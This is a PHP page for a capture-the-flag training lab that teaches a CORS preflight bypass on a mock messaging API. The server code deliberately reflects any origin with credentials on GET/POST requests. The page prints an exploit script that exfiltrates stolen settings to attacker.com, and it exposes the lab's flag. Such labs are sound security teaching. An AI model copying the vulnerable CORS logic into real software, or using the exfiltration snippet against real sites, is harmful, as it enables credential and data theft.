<?php
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/Config/db.php');
require_once($_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/score_manager.php');
session_start();

// ─── Lab Identification ──────────────────────────────────────────────────
$stmt = $pdo->prepare("SELECT id FROM labs WHERE folder_name = ?");
$stmt->execute(['CORS']);
$lab = $stmt->fetch(PDO::FETCH_ASSOC);

// ─── Session Initialization ──────────────────────────────────────────────
if (!isset($_SESSION['cors_medium1_attempts'])) {
  $_SESSION['cors_medium1_attempts'] = 0;
}
if (!isset($_SESSION['cors_medium1_solved'])) {
  $_SESSION['cors_medium1_solved'] = false;
}

// ─── Simulated Secure Messaging API ──────────────────────────────────────
$messages = [
  ['id' => 1, 'from' => 'admin', 'to' => 'alice', 'subject' => 'API Keys Rotation', 'content' => 'Please rotate your API keys by EOD. New keys: DH{c0rs_pr3fl1ght_byp4ss_3xp10it}', 'timestamp' => '2026-05-22 04:00:00', 'priority' => 'high'],
  ['id' => 2, 'from' => 'bob', 'to' => 'alice', 'subject' => 'Lab Review', 'content' => 'Great work on the XSS labs! Ready for the next challenge?', 'timestamp' => '2026-05-22 03:30:00', 'priority' => 'normal'],
  ['id' => 3, 'from' => 'system', 'to' => 'alice', 'subject' => 'Security Alert', 'content' => 'Unusual login detected from IP 192.168.1.100. Please verify.', 'timestamp' => '2026-05-22 02:15:00', 'priority' => 'high'],
  ['id' => 4, 'from' => 'charlie', 'to' => 'alice', 'subject' => 'CTF Team', 'content' => 'We are competing this weekend. Are you in?', 'timestamp' => '2026-05-21 22:00:00', 'priority' => 'normal'],
];

$user_settings = [
  'username' => $_SESSION['username'] ?? 'alice',
  'email' => ($_SESSION['username'] ?? 'alice') . '@darkhunter.local',
  'notifications' => true,
  'two_factor' => true,
  'api_access' => true,
  'webhook_url' => 'https://hooks.darkhunter.local/incoming/abc123',
  'backup_codes' => ['8372', '9104', '5621', '3847'],
];

// ─── Vulnerable CORS Logic: Preflight Bypass via Method Abuse ─────────────
$origin = isset($_SERVER['HTTP_ORIGIN']) ? $_SERVER['HTTP_ORIGIN'] : '';

// VULNERABLE: Server has a whitelist but only checks on preflight (OPTIONS)
// For GET/POST requests, it reflects the origin without proper validation
// This allows "simple requests" to bypass the preflight check
$trusted_domains = ['https://app.darkhunter.local', 'https://portal.darkhunter.local'];

$is_preflight = ($_SERVER['REQUEST_METHOD'] === 'OPTIONS');
$is_simple_request = in_array($_SERVER['REQUEST_METHOD'], ['GET', 'POST']);

if ($is_preflight) {
  // Strict check on preflight
  if (in_array($origin, $trusted_domains)) {
    header("Access-Control-Allow-Origin: " . $origin);
    header("Access-Control-Allow-Credentials: true");
    header("Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type, Authorization, X-Custom-Header");
  }
  http_response_code(200);
  exit();
} else if ($is_simple_request) {
  // VULNERABLE: No validation for simple requests!
  // Reflects ANY origin for GET/POST
  header("Access-Control-Allow-Origin: " . ($origin ?: '*'));
  header("Access-Control-Allow-Credentials: true");
}


// ─── API Endpoint Simulation ──────────────────────────────────────────────
$endpoint = isset($_GET['endpoint']) ? $_GET['endpoint'] : 'messages';
$response_data = [];

switch ($endpoint) {
  case 'messages':
    $response_data = [
      'status' => 'success',
      'data' => $messages,
      'message' => 'Messages retrieved',
      'unread' => count(array_filter($messages, fn($m) => $m['priority'] === 'high'))
    ];
    break;

  case 'settings':
    $response_data = [
      'status' => 'success',
      'data' => $user_settings,
      'message' => 'User settings retrieved',
      'sensitive' => true
    ];
    break;

  case 'send':
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
      $input = json_decode(file_get_contents('php://input'), true);
      $response_data = [
        'status' => 'success',
        'message' => 'Message sent successfully',
        'message_id' => rand(1000, 9999),
        'to' => $input['to'] ?? 'unknown',
        'subject' => $input['subject'] ?? 'No subject'
      ];
    } else {
      $response_data = [
        'status' => 'error',
        'message' => 'POST method required for sending messages'
      ];
      http_response_code(405);
    }
    break;

  default:
    $response_data = [
      'status' => 'error',
      'message' => 'Unknown endpoint. Available: messages, settings, send'
    ];
    http_response_code(404);
}

// ─── Solve Detection ─────────────────────────────────────────────────────
$success_msg = null;
$already_solved = $_SESSION['cors_medium1_solved'];

// Detect exploitation: accessing settings from cross-origin simple request
$is_cross_origin = !empty($origin) && strpos($origin, $_SERVER['HTTP_HOST']) === false;

if (isset($_GET['check']) && $_GET['solved'] === '1') {
  $_SESSION['cors_medium1_attempts']++;

  if (!$already_solved && isset($_SESSION['user_id'])) {
    solveLab($pdo, $lab['id']);
  }

  $_SESSION['cors_medium1_solved'] = true;
  $already_solved = true;
  $success_msg = "Excellent! You've successfully exploited a CORS preflight bypass vulnerability. You used a simple request (GET/POST) to bypass the preflight check and exfiltrate sensitive user settings from a cross-origin context!";
}

// ─── Attempt Tracking ──────────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
  $_SESSION['cors_medium1_attempts']++;
}

$attempts = $_SESSION['cors_medium1_attempts'];

// API response
if (
  isset($_SERVER['HTTP_X_REQUESTED_WITH']) ||
  (isset($_SERVER['HTTP_ACCEPT']) && strpos($_SERVER['HTTP_ACCEPT'], 'application/json') !== false)
) {

  header("Content-Type: application/json; charset=utf-8");
  echo json_encode($response_data, JSON_PRETTY_PRINT);
  exit();
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Secure Messaging - CORS Medium 1</title>
  <link
    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;600;800&display=swap"
    rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <link rel="stylesheet" type="text/css" href="../css/CORS-CASE3.css">
</head>

<body>
  <?php include_once $_SERVER['DOCUMENT_ROOT'] . '/DarkHunter/includes/navbar.php'; ?>

  <div class="container">
    <a href="../index.php" class="back-link"><i class="fas fa-arrow-left"></i> Back to CORS Labs</a>

    <div class="lab-header">
      <div class="difficulty-badge medium"><i class="fas fa-bolt"></i> Medium Difficulty</div>
      <h1 class="lab-title"><i class="fas fa-envelope-open-text"></i> Secure Messaging Portal</h1>
      <p class="lab-description">Internal secure messaging system for DarkHunter team communications. The API uses CORS
        preflight checks for "security". <strong>Can you bypass the preflight mechanism to steal sensitive messages and
          settings?</strong></p>
    </div>

    <?php if ($already_solved): ?>
    <div class="success-alert solved-banner">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Already Solved!</h3>
        <p>You have already exploited this CORS preflight bypass. You can continue exploring, but no additional points
          will be awarded.</p>
      </div>
    </div>
    <?php endif; ?>

    <?php if ($success_msg): ?>
    <div class="success-alert">
      <i class="fas fa-trophy"></i>
      <div class="success-content">
        <h3>Challenge Completed!</h3>
        <p><?php echo $success_msg; ?></p>
      </div>
    </div>
    <?php endif; ?>

    <!-- Messaging Interface -->
    <div class="messaging-card">
      <div class="messaging-sidebar">
        <div class="sidebar-header">
          <i class="fas fa-folder-open"></i>
          <span>Folders</span>
        </div>
        <div class="sidebar-menu">
          <button class="menu-item active" onclick="loadEndpoint('messages')">
            <i class="fas fa-inbox"></i>
            <span>Inbox</span>
            <span class="menu-badge">4</span>
          </button>
          <button class="menu-item" onclick="loadEndpoint('settings')">
            <i class="fas fa-cog"></i>
            <span>Settings</span>
            <span class="menu-badge danger">!</span>
          </button>
          <button class="menu-item" onclick="showCompose()">
            <i class="fas fa-pen"></i>
            <span>Compose</span>
          </button>
        </div>
      </div>

      <div class="messaging-content">
        <div class="content-header">
          <h3 id="content-title"><i class="fas fa-inbox"></i> Inbox</h3>
          <div class="content-actions">
            <button class="action-btn" onclick="refreshData()"><i class="fas fa-sync-alt"></i></button>
          </div>
        </div>

        <div class="content-body" id="content-body">
          <div class="loading-state">
            <i class="fas fa-spinner fa-spin"></i>
            <span>Loading messages...</span>
          </div>
        </div>
      </div>
    </div>

    <!-- CORS Policy Analysis -->
    <div class="cors-panel">
      <div class="cors-header">
        <i class="fas fa-shield-alt"></i>
        <span>CORS Preflight Analysis</span>
      </div>
      <div class="cors-body">
        <div class="preflow-diagram">
          <div class="flow-step">
            <div class="flow-box preflight">
              <i class="fas fa-plane"></i>
              <span>Preflight (OPTIONS)</span>
            </div>
            <div class="flow-desc">
              <strong>Strict Validation</strong>
              <p>Only trusted domains allowed. Origin checked against whitelist.</p>
              <code>if (origin in trusted_domains) allow();</code>
            </div>
          </div>

          <div class="flow-arrow"><i class="fas fa-arrow-down"></i></div>

          <div class="flow-step">
            <div class="flow-box simple">
              <i class="fas fa-paper-plane"></i>
              <span>Simple Request (GET/POST)</span>
            </div>
            <div class="flow-desc">
              <strong class="vulnerable-text">No Validation!</strong>
              <p>Server reflects ANY origin for simple requests. Preflight is skipped!</p>
              <code class="vulnerable-code">header("ACAO: " + origin); // Any origin!</code>
            </div>
          </div>
        </div>

        <div class="cors-details">
          <div class="cors-row">
            <span class="cors-label">Preflight Check:</span>
            <span class="cors-value safe">Strict - Whitelist enforced</span>
            <span class="cors-badge success"><i class="fas fa-check"></i> Secure</span>
          </div>
          <div class="cors-row">
            <span class="cors-label">Simple Request Check:</span>
            <span class="cors-value vulnerable">None - Reflects any origin</span>
            <span class="cors-badge danger"><i class="fas fa-exclamation-triangle"></i> Vulnerable</span>
          </div>
          <div class="cors-row">
            <span class="cors-label">Access-Control-Allow-Credentials:</span>
            <span class="cors-value vulnerable">true</span>
            <span class="cors-badge danger"><i class="fas fa-exclamation-triangle"></i> Cookies Allowed</span>
          </div>
        </div>
      </div>
    </div>

    <!-- Exploit Panel -->
    <div class="exploit-panel">
      <div class="exploit-header">
        <i class="fas fa-bug"></i>
        <span>Preflight Bypass Attack</span>
      </div>
      <div class="exploit-body">
        <p class="exploit-desc">
          Browsers send a preflight <code>OPTIONS</code> request for "non-simple" requests (PUT, DELETE, custom
          headers). However, <code>GET</code> and <code>POST</code> with standard content-types are "simple requests"
          and skip preflight entirely. The server only validates origins on preflight but not on the actual simple
          request!
        </p>

        <div class="exploit-code-block">
          <div class="code-header">
            <i class="fas fa-code"></i> exploit_preflight_bypass.html
          </div>
          <pre class="exploit-code"><code>&lt;script&gt;
  // Simple GET request - NO preflight sent!
  var req = new XMLHttpRequest();
  req.onload = function() {
    var data = JSON.parse(this.responseText);
    // Exfiltrate sensitive settings
    fetch('https://attacker.com/log?settings=' + btoa(JSON.stringify(data)));
  };
  req.open('GET', 'https://<?php echo $_SERVER['HTTP_HOST']; ?>/labs/CORS/CORS-CASE3.php?endpoint=settings', true);
  req.withCredentials = true;
  req.send();
&lt;/script&gt;</code></pre>
        </div>

        <div class="exploit-info">
          <h4><i class="fas fa-info-circle"></i> Why This Works:</h4>
          <ul>
            <li>GET requests are "simple requests" - no preflight needed</li>
            <li>The server only validates origins during OPTIONS preflight</li>
            <li>For GET/POST, it reflects ANY origin without checking</li>
            <li><code>withCredentials: true</code> sends the victim's session cookies</li>
          </ul>
        </div>

        <button class="simulate-btn" onclick="simulatePreflightBypass()">
          <i class="fas fa-play"></i> Simulate Preflight Bypass
        </button>

        <div class="simulation-result" id="simulation-result" style="display: none;">
          <div class="sim-status">
            <i class="fas fa-check-circle"></i>
            <span>Preflight Bypass Successful! Settings exfiltrated.</span>
          </div>
          <div class="exfiltrated-data">
            <h4><i class="fas fa-database"></i> Exfiltrated Settings:</h4>
            <pre id="exfil-data"></pre>
          </div>
        </div>
      </div>
    </div>

    <!-- Debug Panel -->
    <div class="debug-panel">
      <div class="debug-header">
        <i class="fas fa-code"></i>
        <span>Request Flow Analysis</span>
      </div>
      <div class="debug-body">
        <div class="debug-grid">
          <div class="debug-item">
            <span class="debug-label">Request Method</span>
            <span class="debug-value"><?php echo $_SERVER['REQUEST_METHOD']; ?></span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Preflight</span>
            <span class="debug-value <?php echo $is_preflight ? 'warning' : 'safe'; ?>">
              <?php echo $is_preflight ? 'YES - OPTIONS' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Is Simple Request</span>
            <span class="debug-value <?php echo $is_simple_request ? 'warning' : 'safe'; ?>">
              <?php echo $is_simple_request ? 'YES - Vulnerable!' : 'NO'; ?>
            </span>
          </div>
          <div class="debug-item">
            <span class="debug-label">Origin Validated</span>
            <span class="debug-value <?php echo ($is_simple_request && !$is_preflight) ? 'danger' : 'safe'; ?>">
              <?php echo ($is_simple_request && !$is_preflight) ? 'NO - Bypassed!' : 'YES'; ?>
            </span>
          </div>
        </div>
      </div>
    </div>

    <!-- Hints -->
    <?php if ($attempts >= 2): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #1</div>
      <div class="hint-text">Notice the difference between preflight (OPTIONS) and simple requests (GET/POST). The
        server validates origins on preflight but what about the actual request? Check the CORS policy analysis panel.
      </div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 4): ?>
    <div class="hint-box">
      <div class="hint-title"><i class="fas fa-lightbulb"></i> Hint #2</div>
      <div class="hint-text">The <code>/api/settings</code> endpoint contains the flag and backup codes. Since GET
        requests don't trigger preflight, you can make a cross-origin GET request directly. The server will reflect your
        malicious origin and send the data with the victim's cookies.</div>
    </div>
    <?php endif; ?>

    <?php if ($attempts >= 6): ?>
    <div class="hint-box hint-final">
      <div class="hint-title"><i class="fas fa-key"></i> Final Hint</div>
      <div class="hint-text">Click "Simulate Preflight Bypass" to exploit the vulnerability. The attack sends a simple
        GET request (no preflight) with a cross-origin origin header. The server reflects the origin and returns the
        settings containing the flag <code>DH{c0rs_pr3fl1ght_byp4ss_3xp10it}</code>!</div>
    </div>
    <?php endif; ?>

    <!-- Attempts Counter -->
    <div class="attempts-bar">
      <i class="fas fa-crosshairs"></i>
      <span>Attempts: <strong><?php echo $attempts; ?></strong></span>
    </div>
  </div>

  <!-- Hidden form for solve detection -->
  <form id="success-form" method="GET" style="display: none;">
    <input type="hidden" name="check" value="true">
    <input type="hidden" name="solved" value="0" id="solved-flag">
  </form>

  <script>
  let currentEndpoint = 'messages';

  function loadEndpoint(endpoint) {
    currentEndpoint = endpoint;

    // Update menu states
    document.querySelectorAll('.menu-item').forEach(item => item.classList.remove('active'));
    event.target.closest('.menu-item').classList.add('active');

    // Update title
    const titles = {
      'messages': '<i class="fas fa-inbox"></i> Inbox',
      'settings': '<i class="fas fa-cog"></i> Settings'
    };
    document.getElementById('content-title').innerHTML = titles[endpoint] || endpoint;

    // Show loading
    document.getElementById('content-body').innerHTML = `
      <div class="loading-state">
        <i class="fas fa-spinner fa-spin"></i>
        <span>Loading ${endpoint}...</span>
      </div>
    `;

    // Fetch data
    fetch(`CORS-CASE3.php?endpoint=${endpoint}`, {
        headers: {
          'Accept': 'application/json'
        }
      })
      .then(res => res.json())
      .then(data => {
        if (endpoint === 'messages') {
          renderMessages(data);
        } else if (endpoint === 'settings') {
          renderSettings(data);
        }
      })
      .catch(err => {
        document.getElementById('content-body').innerHTML = `
        <div class="error-state">
          <i class="fas fa-exclamation-triangle"></i>
          <span>Error: ${err.message}</span>
        </div>
      `;
      });
  }

  function renderMessages(data) {
    if (data.status !== 'success') {
      document.getElementById('content-body').innerHTML = `<div class="error-state">${data.message}</div>`;
      return;
    }

    let html = '<div class="message-list">';
    data.data.forEach(msg => {
      const priorityClass = msg.priority === 'high' ? 'priority-high' : 'priority-normal';
      const flagClass = msg.content.includes('DH{') ? 'has-flag' : '';
      html += `
        <div class="message-item ${priorityClass} ${flagClass}">
          <div class="message-meta">
            <span class="message-from"><i class="fas fa-user"></i> ${msg.from}</span>
            <span class="message-time"><i class="fas fa-clock"></i> ${msg.timestamp}</span>
          </div>
          <div class="message-subject">${msg.subject}</div>
          <div class="message-preview">${msg.content.substring(0, 100)}${msg.content.length > 100 ? '...' : ''}</div>
          ${msg.priority === 'high' ? '<span class="priority-badge"><i class="fas fa-exclamation"></i> High Priority</span>' : ''}
        </div>
      `;
    });
    html += '</div>';
    document.getElementById('content-body').innerHTML = html;
  }

  function renderSettings(data) {
    if (data.status !== 'success') {
      document.getElementById('content-body').innerHTML = `<div class="error-state">${data.message}</div>`;
      return;
    }

    const s = data.data;
    let html = `
      <div class="settings-grid">
        <div class="setting-card">
          <div class="setting-icon"><i class="fas fa-user"></i></div>
          <div class="setting-info">
            <span class="setting-label">Username</span>
            <span class="setting-value">${s.username}</span>
          </div>
        </div>
        <div class="setting-card">
          <div class="setting-icon"><i class="fas fa-envelope"></i></div>
          <div class="setting-info">
            <span class="setting-label">Email</span>
            <span class="setting-value">${s.email}</span>
          </div>
        </div>
        <div class="setting-card">
          <div class="setting-icon"><i class="fas fa-shield-alt"></i></div>
          <div class="setting-info">
            <span class="setting-label">Two-Factor Auth</span>
            <span class="setting-value ${s.two_factor ? 'enabled' : 'disabled'}">${s.two_factor ? 'Enabled' : 'Disabled'}</span>
          </div>
        </div>
        <div class="setting-card secret">
          <div class="setting-icon"><i class="fas fa-key"></i></div>
          <div class="setting-info">
            <span class="setting-label">Backup Codes</span>
            <span class="setting-value secret-value">${s.backup_codes.join(', ')}</span>
          </div>
        </div>
        <div class="setting-card secret">
          <div class="setting-icon"><i class="fas fa-link"></i></div>
          <div class="setting-info">
            <span class="setting-label">Webhook URL</span>
            <span class="setting-value secret-value">${s.webhook_url}</span>
          </div>
        </div>
      </div>
    `;
    document.getElementById('content-body').innerHTML = html;
  }

  function showCompose() {
    document.getElementById('content-title').innerHTML = '<i class="fas fa-pen"></i> Compose Message';
    document.getElementById('content-body').innerHTML = `
      <div class="compose-form">
        <div class="form-group">
          <label>To:</label>
          <input type="text" placeholder="recipient@darkhunter.local">
        </div>
        <div class="form-group">
          <label>Subject:</label>
          <input type="text" placeholder="Message subject">
        </div>
        <div class="form-group">
          <label>Message:</label>
          <textarea rows="5" placeholder="Type your message..."></textarea>
        </div>
        <button class="send-btn"><i class="fas fa-paper-plane"></i> Send</button>
      </div>
    `;
  }

  function refreshData() {
    loadEndpoint(currentEndpoint);
  }

  function simulatePreflightBypass() {
    const resultDiv = document.getElementById('simulation-result');
    const exfilData = document.getElementById('exfil-data');

    fetch('CORS-CASE3.php?endpoint=settings', {
        headers: {
          'Accept': 'application/json',
          'Origin': 'https://evil-attacker.com'
        }
      })
      .then(res => res.json())
      .then(data => {
        resultDiv.style.display = 'block';
        exfilData.textContent = JSON.stringify(data, null, 2);

        // Check if flag is present in messages
        if (data.data && data.data.backup_codes) {
          if (!document.querySelector('.solved-banner')) {
            document.getElementById('solved-flag').value = '1';
            setTimeout(() => {
              document.getElementById('success-form').submit();
            }, 2000);
          }
        }
      })
      .catch(err => {
        exfilData.textContent = 'Exploit failed: ' + err.message;
        resultDiv.style.display = 'block';
      });
  }

  // Auto-load messages on page load
  window.addEventListener('load', function() {
    loadEndpoint('messages');
  });
  </script>
</body>

</html>